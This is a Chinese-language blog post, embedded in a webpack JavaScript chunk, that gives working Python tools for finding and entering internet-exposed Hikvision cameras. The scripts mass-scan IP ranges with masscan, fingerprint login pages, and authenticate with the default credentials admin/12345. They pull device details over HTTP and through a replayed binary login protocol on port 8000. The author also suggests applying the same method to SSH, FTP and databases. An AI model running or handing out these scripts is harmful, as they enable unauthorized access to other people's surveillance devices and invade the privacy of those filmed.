webpackJsonp([35,191],{416:function(n,e){n.exports={rawContent:"\n\n## Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)\n\n> 一切都在不可避免的走向庸俗\n> \n> 王小波\n\n挖坟= =and 最后一个爬虫。\n\n缘起在去年，一个去某阿里的我并不认识的毕业师兄，这个毕业的师兄好像还写了北邮人ip到地址插件，这个师兄在毕业的时候发了一些列摆一摆贵邮的各种安全问题，其中有个摄像头默认用户名密码。结果呢，我就没登录进去那几个摄像头= =\n\n警告：你所做的一切都是有迹可寻的，dont be evil。\n\n我这里只举摄像头的例子。其实能做的很多，ssh服务器，ftp、数据库等等。如果对web安全漏洞比较熟悉，拿到互联网上批量挖掘都行。。。好像不是在讲爬虫了，不过我觉得爬虫就是爬取信息的工具。\n\n顺便一提，最近分析了下阿里的社会招聘，顺便画了下据此得到的阿里架构图，有兴趣的同学可以一起玩.\n\n大概这么几步：\n1. 用高效的扫描器扫描大范围地址段，得到开放端口80的ip列表，最好还是随机而不是顺序排列的\n2. 对地址大海中聊若晨星般的ip进行http请求，获取服务器信息，保存下来。\n3. 找到某种摄像头信息的“基因”(即，这种摄像头必然返回这种信息而其它服务器不会),这里只举一个简单例子\n4. 批量获取弱密码摄像头\n\n首先，我们需要在unix下工作。。。我们需要辅助工具。我这里说下为什么会使用[masscan](https://github.com/robertdavidgraham/masscan)，因为他比我自己写的扫描器比[zmap](https://zmap.io)、nmap更快，快很多，虽然它们各有所长。python这里又做起了胶水语言的勾当= =\n\n```python\n#! /usr/bin python\n# -*- coding: utf-8 -*-\n\n\"\"\"\n扫描指定端口\nusage:\n    python scan_port.py net interface port\n\"\"\"\n\nimport sys\nimport popen2\nimport os\ntry:\n    os.makedirs('data/open_port/')\nexcept:\n    pass\ntry:\n    os.mkdir('dump')\nexcept:\n    pass\n# 扫描网段内80端口, 生成列表\ncmd = \"sudo masscan -i\" + sys.argv[2] + \\\n    \" -p \" + sys.argv[3] + \" --rate 100000 --wait 2 -oL data/open_port/open\" + \\\n    sys.argv[3] + \"_ip.temp \" + \\\n    sys.argv[1] + \" &&\\\n    cut -f4 -d' ' data/open_port/open\" + sys.argv[3] + \\\n    \"_ip.temp > data/open_port/open\" + sys.argv[3] + \"_ip.list &&\\\n    rm -f data/open_port/open\" + sys.argv[3] + \"_ip.temp\"\nprint cmd\n# cmd = \"sudo zmap -i \" + sys.argv[2]  + \\\n#    \" -p \" + sys.argv[3] + \" -o open\" + sys.argv[3] + \\\n#    \"_ip.list \" + sys.argv[1]\n\n(child_stdout, child_stdin) = popen2.popen2(cmd, bufsize=-1, mode='t')\n# 打印输出\nsys.stdout.write(child_stdout.read())\n```\n\n是不是看上去特别奇葩，我把这种奇(zuo)葩(si)的行事方式叫做quick and dirty式，除了确实能用没有其它优点了(ゝ∀･)\n\n速度很快，这已经到我无线上行的顶峰了，旁边打游戏的同学不要打我ლ(╹◡╹ლ)。喝杯水，看会有爱的[eloquent javascript](http://eloquentjavascript.net/09_regexp.html)，设定下终端静默时提醒，嗯，好像终端提醒这种神器只有[yakuake](https://yakuake.kde.org)会有~^_^~\n\n![](/images/spider/net_scan_1.png)\n\n我们接下来要处理下这些开放80端口的ip，我们把开放80端口的服务器都模拟请求一次，这样就获得每个ip对应的服务器信息。[其实这一步我们可以改masscan源码，这样上一步扫描的时候就能把服务器返回信息返回，我们愉快的解析成想要的格式就行](https://github.com/robertdavidgraham/masscan/search?utf8=%E2%9C%93&q=HTTP%2FGET+)\n\n```python\n#! /usr/bin python\n# -*- coding: utf-8 -*-\n\n\"\"\"\n获取server dict\n\"\"\"\n\nimport socket\nfrom gevent import monkey\nmonkey.patch_all()\n\n# 设置默认timeout时间\ntimeout = 20\nsocket.setdefaulttimeout(timeout)\n\nimport requests\nimport pickle\n\nwith open('./data/open_port/open80_ip.list') as f:\n    ips = f.readlines()\n\nips = [ip.strip() for ip in ips]\n# 移除开头和结尾的无关信息\ntry:\n    ips.remove('#masscan')\n    # ips.remove('# end')\nexcept:\n    ips.remove('saddr')\nfinally:\n    ips.remove('')\n# 保存80端口响应\nserver_dict = {}\n\n\ndef check_service(ip):\n    s = requests.session()\n    print \"test\", ip\n    try:\n        r = s.get('http://' + ip,\n                  verify=False,\n                  allow_redirects=True,\n                  timeout=20)\n        server_dict[ip] = r\n    except:\n        pass\n\nfrom gevent.pool import Pool\npool = Pool(30)\npool.join(timeout=20)\npool.map(check_service, ips)\nprint '-' * 40\nprint \"Dumping port-80 response...\"\nwith open('./data/dict/server_dict.txt', 'wb') as f:\n    pickle.dump(server_dict, f)\n```\n\n好吧，monkey_patch,gevent这点非常适合这种quick&dirty的脏活累活，就像我常做的事情。。。\n\n\n![](/images/spider/net_scan_2.png)\n\ngevent是啥呢？不知道的自己谷歌吧，我也不知道是啥，据说是对libev的封装，据说是协程、据说是yield，据说yield是好像操作系统完成一次任务切换，据说操作系统任务切换在x86下要靠TSS，据说...\n\n总之，你阻塞的每次请求变成了可以并发的请求。这里的坑我不想说，因为我不懂= =，但你可以自己试试不用gevent的版本。\n\n另外，这里会比masscan慢上无数倍，masscan用用户态的网络栈来实现无状态了，我们这里则是用着系统提供的网络栈。\n\n接下来，该看看怎么获取某种摄像头的“基因”并且批量登录了，这之前已经提到过，用浏览器检查整个过程。找到其特点。\n\n![](/images/spider/net_scan_3.png)\n\n我觉得这东西就是其特点了<span>´ ▽ ` )ﾉ</span>\n\n对符合特点的ip地址，我们不妨试着登录下。果然跳转到另一个页面了。分析下如何登录的吧\n\n这种默认用户名密码上网一搜就搜到了= =\n\n![](/images/spider/net_scan_4.png)\n\n![](/images/spider/net_scan_5.png)\n\n同理，我们可以找到设备信息的地址。万事具备，只剩代码\n\n```python\n#! /usr/bin python\n# -*- coding: utf-8 -*-\n\n\"\"\"\n获取摄像头信息框架\n输入：\n- 特征字符串\n- 获取信息方法。同步/异步\n输出：\n编号文件camera_num\nid:name:username:password\n\"\"\"\n\nimport socket\nfrom gevent import monkey\nmonkey.patch_all()\n\n# 设置默认timeout时间\ntimeout = 100\nsocket.setdefaulttimeout(timeout)\n\nimport requests\nimport pickle\n\nwith open('./data/dict/server_dict.txt') as f:\n    server_dict = pickle.load(f)\n# Hikvision: 可登录验证\n#\n# 第一种\nprint \"Hikvision IP Camera found:\"\nprint \"Username: admin\"\nprint \"Password: 12345\"\nt_1 = {}\nprint \"-\" * 40\nfor x in server_dict.iteritems():\n    if x[1].content.find('doc/page/login.asp') >= 0:\n        print x[0]\n        t_1[x[0]] = ''\n\n\n# 抓取第一种设备信息\ndef device_info(ip):\n    s = requests.session()\n    s.auth = ('admin', '12345')\n    try:\n        r = s.get('http://' + ip + '/PSIA/System/deviceInfo')\n        if r.ok:\n            t_1[ip] = r.content\n        else:\n            r = s.get('http://' + ip + '/ISAPI/System/deviceInfo')\n            if r.ok:\n                t_1[ip] = r.content\n    except:\n        t_1[ip] = ''\n        pass\n\nfrom gevent.pool import Pool\npool = Pool(300)\npool.join(timeout=100)\npool.map(device_info, [ip for ip in t_1.keys()])\nprint \"[*] Dumping type 1 devices info\"\nwith open('./dump/camera/t_1.txt', 'wb') as f:\n    pickle.dump(t_1, f)\n```\n\n![](/images/spider/net_scan_6.png)\n\n获取的设备信息是xml格式的，我们可以自由的利用python的xml库进行解析，进行数据分析等等。\n\n另外，有很多摄像头要求浏览器安装自己的浏览器activex插件，我们可以用wireshark或类似东西抓下包，找到其相关信息的位置，然后猜测解析协议。比如，另一种摄像头\n\n```python\n#! /usr/bin python\n# -*- coding: utf-8 -*-\n\n\"\"\"\nt_2\nOCX\n\"\"\"\n# FIXME: 经常失败？\n# 目前想法是控制timeout\n# 多次请求后成功率变高？\n\nimport socket\n\n# 设置默认timeout时间\ntimeout = 2\nsocket.setdefaulttimeout(timeout)\n\nimport pickle\nimport struct\n\nwith open('./data/dict/server_dict.txt') as f:\n    server_dict = pickle.load(f)\n\n# 第二种\nprint '-' * 40\nprint \"Find IP Camera Type 2\"\nprint \"Hikvision IP Camera found:(ObjectX, check disabled)\"\nprint \"Username: admin\"\nprint \"Password: 12345\"\nt_2 = {}\nfor x in server_dict.iteritems():\n    if x[1].content.find('NetOCX') >= 0:\n        t_2[x[0]] = ''\n        print x[0]\n\n\n# 抓取第二种设备信息\ndef device_info(ip):\n    print \"test \", ip\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((ip, 8000))\n        s.send(\"\\x00\\x00\\x00TZ\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x04\\x00(\\xc1\\x00\\x00\\x00\\x00\\x0f\\x02\\x00\\n\\x08\\x00';Je\\x00\\x00tsXrcsXYs9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00bbXcsXctst\\x00\\x00\\x00\\x00\\x00\\x00\")\n        data = s.recv(1024)\n        login_rt = \"\\x00\\x00\\x00L'\\x00\\x00\\x00\\x00\\x00\\x00'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n        s.close()\n        if data != login_rt:\n            t_2[ip] = ''\n            return\n        else:\n            # 首先是个seq\n            # 可能无效包，但测试必须有后面才正常\n            for i in range(3):\n                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                s.connect((ip, 8000))\n                seq_req = \"\\x00\\x00\\x00TZ\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x10\\x04\\x00(\\xc1\\x00\\x00\\x00\\x00\\x0f\\x02\\x00\\n\\x08\\x00';Je\\x00\\x00z\\xdaf\\x00\\x8d\\x16\\xd2~\\x9dU\\x05\\xf1\\x1fi\\xbb\\xa9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc3\\xd0\\xa2|\\xa6v\\xbd\\xf3\\x1eO\\xd1\\xcb\\xdc\\xae\\xcbd\"\n                s.send(seq_req)\n                seq_ret = s.recv(1024)\n                del seq_ret\n                s.close()\n            # 然后是name_seq\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.connect((ip, 8000))\n            name_seq_req = \"\\x00\\x00\\x00 Z\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x0f\\x02\\x00\\n\\x00\\x01\\x00\\x02\\x08\\x00';Je\\x00\\x00\"\n            s.send(name_seq_req)\n            name_seq_ret = s.recv(1024)\n            # print \"name_seq_ret: \", name_seq_ret\n            s.close()\n            # 其次是chanel\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.connect((ip, 8000))\n            chanel_req = \"\\x00\\x00\\x00$Z\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x022\\x0f\\x02\\x00\\n\\x00\\x01\\x00\\x02\\x08\\x00';Je\\x00\\x00\\x00\\x00\\x00\\x01\"\n            s.send(chanel_req)\n            chanel_ret = s.recv(1024)\n            # print \"Chanle_ret: \", chanel_ret\n            # 再来解析mac地址\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.connect((ip, 8000))\n            mac_req = \"\\x00\\x00\\x00 Z\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x01\\x00\\x0f\\x02\\x00\\n\\x00\\x01\\x00\\x02\\x08\\x00';Je\\x00\\x00\"\n            s.send(mac_req)\n            mac_ret = s.recv(1024)\n            s.close()\n            t_2[ip] = {'chanel': chanel_ret[20:40].strip('\\x00').decode('gbk'),\n                       'server_name': name_seq_ret[20:40].strip('\\x00'),\n                       'seqnum': name_seq_ret[60:100].strip('\\x00'),\n                       'mac': \"%02x:%02x:%02x:%02x:%02x:%02x:\" % struct.unpack('BBBBBB', mac_ret[36:42])}\n    except:\n        t_2[ip] = ''\n        pass\n\nfor ip in t_2.keys():\n    device_info(ip)\nprint \"[*] Dumping type 2 devices info\"\nwith open('./dump/camera/t_2.txt', 'wb') as f:\n    pickle.dump(t_2, f)\n\nfor k, v in t_2.iteritems():\n    if v == '':\n        print k, ': login failed'\n        continue\n    print k, ': Ok, info dumped.'\n```\n\n根据同样的原理，我们还可以写爬虫搜集整个局域网互联网内其它信息，比如ftp，特别是匿名ftp，sql，代理服务器啊，等等，\n\n大概是知道创宇的zoomeye出来之前，我想在贵邮局域网实现shadon，一个设备杂项搜索引擎，最后，实验室太忙了= =只有个从未公开的ftp搜索web界面\n\n![](/images/spider/net_scan_7.png)\n\n第一次做效率奇低，特别在加上不同的中文编码\n\n![](/images/spider/net_scan_8.png)\n\n第二次好多了，如果以后有空再说吧\n",metaData:{layout:"post",title:"Python Spider: 海康威视摄像头发现",excerpt:"速写爬虫的一些经历",category:"python",tags:["python","spider"],disqus:!0}}}});